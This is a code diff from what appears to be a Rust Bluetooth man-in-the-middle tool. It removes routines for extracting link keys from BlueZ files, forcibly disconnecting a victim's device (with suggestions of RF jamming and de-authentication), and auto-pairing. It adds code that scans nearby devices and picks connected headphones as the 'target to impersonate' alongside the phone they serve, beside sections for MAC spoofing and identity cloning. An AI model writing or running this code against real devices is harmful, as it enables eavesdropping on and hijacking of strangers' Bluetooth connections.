@@ -1,11 +1,7 @@
 use libc::{c_int, socklen_t};
-use std::process::{Command, Stdio};
-use std::sync::{Arc, Mutex};
-use std::sync::atomic::{AtomicBool, Ordering};
-use std::thread;
-use std::time::Duration;
+use std::process::Command;
 
-use crate::config::{BACKLOG, BLUETOOTH_INFO_PATH};
+use crate::config::BACKLOG;
 use crate::{debug_print, error_print, info_print};
 
 // ── Linux Bluetooth constants ────────────────────────────────────────────────
@@ -20,6 +16,46 @@ pub struct BtDevice {
     pub rssi: i32,
     pub connected: bool,
     pub cod: Option<String>,
+}
+
+/// Broad category derived from the Class-of-Device field.
+#[derive(Debug, Clone, PartialEq)]
+pub enum DeviceType {
+    Phone,
+    Audio,
+    Computer,
+    Other,
+}
+
+impl DeviceType {
+    pub fn icon(&self) -> &'static str {
+        match self {
+            DeviceType::Phone    => "📱",
+            DeviceType::Audio    => "🎧",
+            DeviceType::Computer => "💻",
+            DeviceType::Other    => "🔷",
+        }
+    }
+}
+
+/// Classify a device from its hex CoD string (with or without "0x" prefix).
+pub fn classify_cod(cod_hex: &str) -> DeviceType {
+    let clean = cod_hex.trim().trim_start_matches("0x").trim_start_matches("0X");
+    let cod = u32::from_str_radix(clean, 16).unwrap_or(0);
+    match (cod >> 8) & 0x1F {
+        0x02 => DeviceType::Phone,
+        0x04 => DeviceType::Audio,
+        0x01 => DeviceType::Computer,
+        _ => DeviceType::Other,
+    }
+}
+
+/// A detected connection between two nearby devices.
+pub struct DevicePair {
+    /// The device to impersonate (usually the audio device / peripheral).
+    pub target: BtDevice,
+    /// The connecting device (phone/source). May be unknown.
+    pub source: Option<BtDevice>,
 }
 
 // ── sockaddr_l2 layout (BlueZ, Linux) ────────────────────────────────────────
@@ -135,187 +171,6 @@ fn is_valid_mac(s: &str) -> bool {
     s.len() == 17 && s.chars().filter(|&c| c == ':').count() == 5
 }
 
-/// Quick snapshot of paired + connected devices without a full BT inquiry scan.
-fn get_devices_snapshot() -> Vec<BtDevice> {
-    let mut devices: Vec<BtDevice> = Vec::new();
-
-    // All known/paired devices
-    let out = run_popen("bluetoothctl -- devices 2>/dev/null");
-    for line in out.lines() {
-        let clean = strip_ansi_codes(line);
-        let parts: Vec<&str> = clean.split_whitespace().collect();
-        if parts.len() >= 2 && parts[0] == "Device" && is_valid_mac(parts[1]) {
-            let name = if parts.len() >= 3 { parts[2..].join(" ") } else { "[Unknown]".to_string() };
-            devices.push(BtDevice {
-                addr: parts[1].to_uppercase(),
-                name,
-                ..Default::default()
-            });
-        }
-    }
-
-    // Mark devices that are currently connected
-    let conn_out = run_popen("bluetoothctl -- devices Connected 2>/dev/null");
-    for line in conn_out.lines() {
-        let clean = strip_ansi_codes(line);
-        let parts: Vec<&str> = clean.split_whitespace().collect();
-        if parts.len() >= 2 && parts[0] == "Device" && is_valid_mac(parts[1]) {
-            let mac = parts[1];
-            match devices.iter_mut().find(|d| d.addr.eq_ignore_ascii_case(mac)) {
-                Some(d) => d.connected = true,
-                None => {
-                    let name = if parts.len() >= 3 {
-                        parts[2..].join(" ")
-                    } else {
-                        "[Active Connection]".to_string()
-                    };
-                    devices.push(BtDevice {
-                        addr: mac.to_uppercase(),
-                        name,
-                        connected: true,
-                        ..Default::default()
-                    });
-                }
-            }
-        }
-    }
-
-    // Also check hcitool con for active ACL/SCO connections
-    let con_out = run_popen("hcitool con 2>/dev/null");
-    for line in con_out.lines() {
-        if line.contains("ACL") || line.contains("SCO") {
-            let parts: Vec<&str> = line.split_whitespace().collect();
-            // Format: "> ACL AA:BB:CC:DD:EE:FF handle …"
-            if parts.len() >= 3 && is_valid_mac(parts[2]) {
-                let mac = parts[2];
-                match devices.iter_mut().find(|d| d.addr.eq_ignore_ascii_case(mac)) {
-                    Some(d) => d.connected = true,
-                    None => {
-                        devices.push(BtDevice {
-                            addr: mac.to_uppercase(),
-                            name: "[Active Connection]".to_string(),
-                            connected: true,
-                            ..Default::default()
-                        });
-                    }
-                }
-            }
-        }
-    }
-
-    devices
-}
-
-// ── Live scanner ─────────────────────────────────────────────────────────────
-
-/// Live-updating Bluetooth device scanner.
-///
-/// On creation it immediately starts a background thread that:
-/// 1. Kicks off a BlueZ discovery scan via `bluetoothctl scan on`.
-/// 2. Polls `bluetoothctl devices` every ~3 seconds and merges results into
-///    the shared `devices` list.
-///
-/// Dropping the `LiveScanner` signals the background thread to stop.
-pub struct LiveScanner {
-    pub devices: Arc<Mutex<Vec<BtDevice>>>,
-    stop_flag: Arc<AtomicBool>,
-}
-
-impl Drop for LiveScanner {
-    fn drop(&mut self) {
-        self.stop_flag.store(true, Ordering::SeqCst);
-    }
-}
-
-impl LiveScanner {
-    /// Start the live scanner. Returns immediately; scanning happens in the
-    /// background.
-    pub fn start() -> Self {
-        let devices: Arc<Mutex<Vec<BtDevice>>> = Arc::new(Mutex::new(Vec::new()));
-        let stop_flag = Arc::new(AtomicBool::new(false));
-
-        let devs = Arc::clone(&devices);
-        let stop = Arc::clone(&stop_flag);
-
-        // Tell the BlueZ daemon to start active discovery so that non-paired
-        // devices become visible in `bluetoothctl devices`.  We detach this
-        // process; it will be cleaned up by the OS when bluetoothd resets.
-        let _ = Command::new("sh")
-            .args(["-c", "bluetoothctl -- scan on >/dev/null 2>&1 &"])
-            .stdout(Stdio::null())
-            .stderr(Stdio::null())
-            .spawn();
-
-        thread::spawn(move || {
-            loop {
-                if stop.load(Ordering::SeqCst) {
-                    break;
-                }
-
-                let fresh = get_devices_snapshot();
-                {
-                    let mut lock = devs.lock().unwrap();
-                    for new_dev in fresh {
-                        match lock
-                            .iter_mut()
-                            .find(|d| d.addr.eq_ignore_ascii_case(&new_dev.addr))
-                        {
-                            Some(existing) => {
-                                existing.connected = new_dev.connected;
-                                if existing.name.is_empty() || existing.name == "[Unknown]" {
-                                    existing.name = new_dev.name;
-                                }
-                            }
-                            None => lock.push(new_dev),
-                        }
-                    }
-                }
-
-                // Sleep for 3 s, but check the stop flag every 100 ms.
-                for _ in 0..30 {
-                    if stop.load(Ordering::SeqCst) {
-                        return;
-                    }
-                    thread::sleep(Duration::from_millis(100));
-                }
-            }
-        });
-
-        LiveScanner { devices, stop_flag }
-    }
-}
-
-// ── Link key ─────────────────────────────────────────────────────────────────
-
-/// Read the link key for `device_mac` from BlueZ's info file on disk.
-pub fn bt_extract_link_key(adapter_mac: &str, device_mac: &str) -> Result<String, String> {
-    let path = format!("{}/{}/{}/info", BLUETOOTH_INFO_PATH, adapter_mac, device_mac);
-    let contents = std::fs::read_to_string(&path).map_err(|e| {
-        error_print!("Failed to open info file: {}: {}", path, e);
-        e.to_string()
-    })?;
-
-    let mut in_linkkey = false;
-    for line in contents.lines() {
-        if line.trim() == "[LinkKey]" {
-            in_linkkey = true;
-            continue;
-        }
-        if in_linkkey {
-            if let Some(rest) = line.strip_prefix("Key=") {
-                let key = rest.trim().to_string();
-                info_print!("Link key extracted: {}", key);
-                return Ok(key);
-            }
-            if line.starts_with('[') {
-                break; // left [LinkKey] section
-            }
-        }
-    }
-
-    error_print!("Link key not found in info file");
-    Err("Link key not found".to_string())
-}
 
 // ── MAC spoofing ─────────────────────────────────────────────────────────────
 
@@ -436,112 +291,6 @@ pub fn bt_accept_l2cap(server_sock: c_int) -> Result<(c_int, String), String> {
     Ok((client, client_addr))
 }
 
-// ── Device scanning ──────────────────────────────────────────────────────────
-
-/// Scan for visible devices and mark those with active ACL/SCO connections.
-pub fn bt_scan_active_connections(max_devices: usize) -> Vec<BtDevice> {
-    info_print!("Scanning for active Bluetooth connections in the area...");
-    let mut devices: Vec<BtDevice> = Vec::new();
-
-    // Pass 1: bluetoothctl devices – known/paired devices (works on modern BlueZ).
-    // Strip ANSI codes because bluetoothctl uses colour output on some systems.
-    let btctl_out = run_popen("bluetoothctl -- devices 2>/dev/null");
-    for line in btctl_out.lines() {
-        let clean = strip_ansi_codes(line);
-        // Format: "Device AA:BB:CC:DD:EE:FF Device Name"
-        let parts: Vec<&str> = clean.split_whitespace().collect();
-        if parts.len() >= 2 && parts[0] == "Device" && is_valid_mac(parts[1]) {
-            if devices.len() >= max_devices {
-                break;
-            }
-            let name = if parts.len() >= 3 { parts[2..].join(" ") } else { "[Unknown]".to_string() };
-            devices.push(BtDevice {
-                addr: parts[1].to_uppercase(),
-                name,
-                ..Default::default()
-            });
-        }
-    }
-
-    // Pass 2: bluetoothctl devices Connected – mark connected devices.
-    let btctl_connected = run_popen("bluetoothctl -- devices Connected 2>/dev/null");
-    for line in btctl_connected.lines() {
-        let clean = strip_ansi_codes(line);
-        let parts: Vec<&str> = clean.split_whitespace().collect();
-        if parts.len() >= 2 && parts[0] == "Device" && is_valid_mac(parts[1]) {
-            let mac = parts[1];
-            let mut found = false;
-            for d in devices.iter_mut() {
-                if d.addr.eq_ignore_ascii_case(mac) {
-                    d.connected = true;
-                    found = true;
-                }
-            }
-            if !found && devices.len() < max_devices {
-                let name = if parts.len() >= 3 { parts[2..].join(" ") } else { "[Active Connection]".to_string() };
-                devices.push(BtDevice {
-                    addr: mac.to_uppercase(),
-                    name,
-                    connected: true,
-                    ..Default::default()
-                });
-            }
-        }
-    }
-
-    // Pass 3: hcitool scan – additional visible devices not yet known (BR/EDR fallback).
-    let scan = run_popen("timeout 5 hcitool scan 2>/dev/null");
-    for line in scan.lines() {
-        // Format: "\tAA:BB:CC:DD:EE:FF\tDevice Name"
-        let parts: Vec<&str> = line.split_whitespace().collect();
-        if !parts.is_empty() && is_valid_mac(parts[0]) {
-            let mac = parts[0];
-            if !devices.iter().any(|d| d.addr.eq_ignore_ascii_case(mac)) {
-                if devices.len() >= max_devices {
-                    break;
-                }
-                devices.push(BtDevice {
-                    addr: mac.to_uppercase(),
-                    name: if parts.len() >= 2 { parts[1..].join(" ") } else { "[Unknown]".to_string() },
-                    ..Default::default()
-                });
-            }
-        }
-    }
-
-    // Pass 4: hcitool con – mark active ACL/SCO connections (fallback for pass 2).
-    let con = run_popen("hcitool con 2>/dev/null");
-    info_print!("Active connections found:");
-    for line in con.lines() {
-        println!("  {}", line);
-        if line.contains("ACL") || line.contains("SCO") {
-            let parts: Vec<&str> = line.split_whitespace().collect();
-            // Format: "> ACL AA:BB:CC:DD:EE:FF handle …"
-            if parts.len() >= 3 && is_valid_mac(parts[2]) {
-                let mac = parts[2];
-                let mut found = false;
-                for d in devices.iter_mut() {
-                    if d.addr.eq_ignore_ascii_case(mac) {
-                        d.connected = true;
-                        found = true;
-                    }
-                }
-                if !found && devices.len() < max_devices {
-                    devices.push(BtDevice {
-                        addr: mac.to_uppercase(),
-                        name: "[Active Connection]".to_string(),
-                        connected: true,
-                        ..Default::default()
-                    });
-                }
-            }
-        }
-    }
-
-    info_print!("Found {} Bluetooth device(s)", devices.len());
-    devices
-}
-
 // ── Connection management ─────────────────────────────────────────────────────
 
 pub fn bt_check_connection_status(device_mac: &str) -> bool {
@@ -570,198 +319,119 @@ pub fn bt_disconnect_device(device_mac: &str) -> Result<(), String> {
     Err("Disconnect failed".to_string())
 }
 
-pub fn bt_force_disconnect(target_mac: &str) -> Result<(), String> {
-    info_print!("=== FORCE DISCONNECT MODE ===");
-    info_print!("Target: {}", target_mac);
 
-    if !bt_check_connection_status(target_mac) {
-        info_print!("Target device is not currently connected");
-        return Ok(());
-    }
+// ── Pair detection ───────────────────────────────────────────────────────────
 
-    info_print!("Target device is currently connected to another device");
-    info_print!("Attempting to break the connection...");
+/// Scan for all nearby Bluetooth devices, classify them, and return detected
+/// connections as (target, source) pairs.
+///
+/// Strategy:
+///   1. `hcitool inq`           — raw inquiry, finds connectable devices + CoD
+///   2. `bluetoothctl devices`  — names for paired/known devices
+///   3. `bluetoothctl info`     — per-device: name, CoD, Connected status
+///   4. Classification          — phone vs audio vs other from CoD major class
+///   5. Pairing heuristic       — audio device with Connected=yes + phone in range
+pub fn bt_find_connected_pairs() -> Vec<DevicePair> {
+    info_print!("Scanning for nearby Bluetooth devices (~10 s)…");
 
-    // Method 1: polite bluetoothctl disconnect
-    info_print!("Method 1: Attempting polite disconnect...");
-    if bt_disconnect_device(target_mac).is_ok() {
-        info_print!("Polite disconnect successful");
-        std::thread::sleep(std::time::Duration::from_secs(2));
-        return Ok(());
-    }
+    let mut devices: Vec<BtDevice> = Vec::new();
 
-    // Method 2: remove pairing
-    info_print!("Method 2: Removing device pairing to force disconnect...");
-    run_popen(&format!(
-        "bluetoothctl -- remove {} >/dev/null 2>&1",
-        target_mac
-    ));
-    std::thread::sleep(std::time::Duration::from_secs(3));
-    if !bt_check_connection_status(target_mac) {
-        info_print!("Forced disconnect successful via pairing removal");
-        return Ok(());
-    }
-
-    // Method 3: HCI-level
-    info_print!("Method 3: Attempting HCI-level disconnect...");
-    let out = run_popen(&format!("hcitool dc {} 2>&1", target_mac));
-    for line in out.lines() {
-        debug_print!("hcitool: {}", line);
-    }
-    std::thread::sleep(std::time::Duration::from_secs(2));
-    if !bt_check_connection_status(target_mac) {
-        info_print!("HCI-level disconnect successful");
-        return Ok(());
-    }
-
-    error_print!("Software disconnect methods failed");
-    info_print!("========================================");
-    info_print!("ADVANCED OPTION: RF Jamming");
-    info_print!("========================================");
-    info_print!("To break a stubborn Bluetooth connection, you may need:");
-    info_print!("1. RF Jammer (2.4GHz) - Hardware device to disrupt connection");
-    info_print!("2. Ubertooth One - For active de-authentication attacks");
-    info_print!("3. Physical separation - Move devices far apart (>100m)");
-    info_print!("4. Power cycle - Turn off source device temporarily");
-    info_print!("");
-    info_print!("For now, proceeding with MITM setup...");
-    info_print!("The interceptor will wait for natural disconnection");
-    info_print!("========================================");
-
-    Err("All software disconnect methods failed".to_string())
-}
-
-// ── Auto-pairing ─────────────────────────────────────────────────────────────
-
-pub fn bt_auto_pair_device(device_mac: &str) -> Result<(), String> {
-    info_print!("Attempting to pair with device: {}", device_mac);
-
-    // Check if already paired
-    let already_paired = std::process::Command::new("sh")
-        .args([
-            "-c",
-            &format!(
-                "bluetoothctl -- info {} 2>&1 | grep -q 'Paired: yes'",
-                device_mac
-            ),
-        ])
-        .status()
-        .map(|s| s.success())
-        .unwrap_or(false);
-
-    info_print!("Powering on Bluetooth adapter...");
-    run_popen("bluetoothctl -- power on >/dev/null 2>&1");
-    std::thread::sleep(std::time::Duration::from_secs(2));
-    run_popen("bluetoothctl -- discoverable on >/dev/null 2>&1");
-    std::thread::sleep(std::time::Duration::from_secs(1));
-
-    info_print!("Scanning for device...");
-    run_popen("timeout 10 bluetoothctl -- scan on >/dev/null 2>&1");
-
-    if already_paired {
-        info_print!("Removing existing pairing...");
-        run_popen(&format!(
-            "bluetoothctl -- remove {} >/dev/null 2>&1",
-            device_mac
-        ));
-        std::thread::sleep(std::time::Duration::from_secs(2));
-    }
-
-    info_print!("Pairing with device...");
-    let pair_out = run_popen(&format!(
-        "timeout 30 bluetoothctl -- pair {} 2>&1",
-        device_mac
-    ));
-    if !pair_out.contains("Pairing successful") && !pair_out.contains("paired successfully") {
-        for line in pair_out.lines() {
-            if line.contains("Failed to pair") || line.contains("org.bluez.Error") {
-                error_print!("Pairing failed: {}", line);
-            }
+    // Pass 1: hcitool inq — finds any connectable device even if not discoverable.
+    // Output lines: "\tAA:BB:CC:DD:EE:FF\tclock offset: 0x1234\tclass: 0x240404"
+    let inq = run_popen("timeout 10 hcitool inq 2>/dev/null");
+    for line in inq.lines() {
+        let parts: Vec<&str> = line.split_whitespace().collect();
+        if parts.is_empty() || !is_valid_mac(parts[0]) {
+            continue;
         }
-        error_print!("Pairing failed");
-        return Err("Pairing failed".to_string());
-    }
-    info_print!("Pairing successful");
-    std::thread::sleep(std::time::Duration::from_secs(2));
-
-    info_print!("Trusting device...");
-    let trust_out = run_popen(&format!(
-        "bluetoothctl -- trust {} 2>&1",
-        device_mac
-    ));
-    if !trust_out.contains("trust succeeded") && !trust_out.contains("already trusted") {
-        error_print!("Failed to trust device");
-        return Err("Failed to trust device".to_string());
+        let mac = parts[0].to_uppercase();
+        let cod = parts.windows(2)
+            .find(|w| w[0] == "class:")
+            .map(|w| w[1].trim_start_matches("0x").to_string());
+        devices.push(BtDevice { addr: mac, cod, ..Default::default() });
     }
 
-    info_print!("Connecting to device...");
-    let conn_out = run_popen(&format!(
-        "timeout 15 bluetoothctl -- connect {} 2>&1",
-        device_mac
-    ));
-    if conn_out.contains("Connection successful") || conn_out.contains("connected successfully") {
-        info_print!("Connection successful");
+    // Pass 2: bluetoothctl devices — names for all devices BlueZ knows about.
+    let btctl = run_popen("bluetoothctl -- devices 2>/dev/null");
+    for line in btctl.lines() {
+        let clean = strip_ansi_codes(line);
+        let parts: Vec<&str> = clean.split_whitespace().collect();
+        if parts.len() < 2 || parts[0] != "Device" || !is_valid_mac(parts[1]) {
+            continue;
+        }
+        let mac = parts[1].to_uppercase();
+        let name = if parts.len() >= 3 { parts[2..].join(" ") } else { String::new() };
+        match devices.iter_mut().find(|d| d.addr.eq_ignore_ascii_case(&mac)) {
+            Some(d) => { if d.name.is_empty() { d.name = name; } }
+            None    => devices.push(BtDevice { addr: mac, name, ..Default::default() }),
+        }
     }
 
-    std::thread::sleep(std::time::Duration::from_secs(3));
-    info_print!("Auto-pairing completed");
-    Ok(())
-}
-
-// ── Source device discovery ──────────────────────────────────────────────────
-
-pub fn bt_discover_source_from_target(target_mac: &str) -> Result<String, String> {
-    info_print!("=== Discovering Source Device (Phone) ===");
-    info_print!("Monitoring Bluetooth connections to target: {}", target_mac);
-    info_print!("");
-    info_print!("Please ensure the phone is connected to the headphones now.");
-    info_print!("Checking connection information...");
-    println!();
-
-    // Show info output for the target
-    let info_out = run_popen(&format!(
-        "bluetoothctl -- info {} 2>&1",
-        target_mac
-    ));
-    for line in info_out.lines() {
-        debug_print!("bluetoothctl: {}", line);
-    }
-
-    info_print!("Method 1: Monitoring for incoming Bluetooth connections...");
-    info_print!("Waiting 10 seconds for phone to connect to headphones...");
-    info_print!("(You may need to disconnect and reconnect the phone to headphones)");
-    println!();
-
-    let monitor = run_popen(&format!(
-        "timeout 10 bluetoothctl 2>&1 | grep -i 'device\\|connected\\|{}' || true",
-        target_mac
-    ));
-
-    for line in monitor.lines() {
-        info_print!("Monitor: {}", line);
-        if line.contains("Device") && line.contains("Connected: yes") {
-            if let Some(start) = line.find("Device ") {
-                let rest = &line[start + 7..];
-                let mac: &str = rest.split_whitespace().next().unwrap_or("");
-                if !mac.eq_ignore_ascii_case(target_mac) && mac.len() == 17 {
-                    info_print!("✓ Discovered source device: {}", mac);
-                    return Ok(mac.to_string());
+    // Pass 3: bluetoothctl info per device — fill in name, CoD, and connected flag.
+    for dev in devices.iter_mut() {
+        let info = run_popen(&format!("bluetoothctl -- info {} 2>/dev/null", dev.addr));
+        for line in info.lines() {
+            let line = line.trim();
+            if let Some(n) = line.strip_prefix("Name: ") {
+                if dev.name.is_empty() { dev.name = n.trim().to_string(); }
+            }
+            if let Some(c) = line.strip_prefix("Class: ") {
+                if dev.cod.is_none() {
+                    dev.cod = Some(c.trim().trim_start_matches("0x").to_string());
                 }
             }
+            if line == "Connected: yes" { dev.connected = true; }
+        }
+        if dev.name.is_empty() {
+            dev.name = "[Unknown]".to_string();
         }
     }
 
-    info_print!("");
-    info_print!("Could not auto-discover phone MAC address.");
-    info_print!("");
-    info_print!("Manual options to find phone MAC:");
-    info_print!("  1. Android: Settings → About Phone → Status → Bluetooth address");
-    info_print!("  2. iPhone: Settings → General → About → Bluetooth");
-    info_print!("  3. Check headphones' app for connected device info");
-    info_print!("  4. Use 'hcitool con' while phone is connected");
-    println!();
+    // Build pairs.
+    build_pairs(devices)
+}
 
-    Err("Could not auto-discover source device".to_string())
+fn build_pairs(devices: Vec<BtDevice>) -> Vec<DevicePair> {
+    let mut pairs: Vec<DevicePair> = Vec::new();
+
+    let phones: Vec<BtDevice> = devices.iter()
+        .filter(|d| d.cod.as_deref().map(classify_cod).unwrap_or(DeviceType::Other) == DeviceType::Phone)
+        .cloned()
+        .collect();
+
+    // Primary: audio devices that BlueZ reports as connected.
+    for dev in devices.iter() {
+        if dev.cod.as_deref().map(classify_cod).unwrap_or(DeviceType::Other) == DeviceType::Audio
+            && dev.connected
+        {
+            let source = if phones.len() == 1 {
+                Some(phones[0].clone())
+            } else {
+                // Multiple phones in range — can't reliably tell which one.
+                None
+            };
+            pairs.push(DevicePair { target: dev.clone(), source });
+        }
+    }
+
+    // Fallback: any connected device (non-audio) if nothing found yet.
+    if pairs.is_empty() {
+        for dev in devices.iter().filter(|d| d.connected) {
+            pairs.push(DevicePair { target: dev.clone(), source: phones.first().cloned() });
+        }
+    }
+
+    // Last resort: all audio devices in range (connected flag may be absent for
+    // devices not paired with this adapter).
+    if pairs.is_empty() {
+        for dev in devices.iter() {
+            if dev.cod.as_deref().map(classify_cod).unwrap_or(DeviceType::Other) == DeviceType::Audio {
+                pairs.push(DevicePair { target: dev.clone(), source: phones.first().cloned() });
+            }
+        }
+    }
+
+    pairs
 }
 
 // ── Identity cloning ─────────────────────────────────────────────────────────
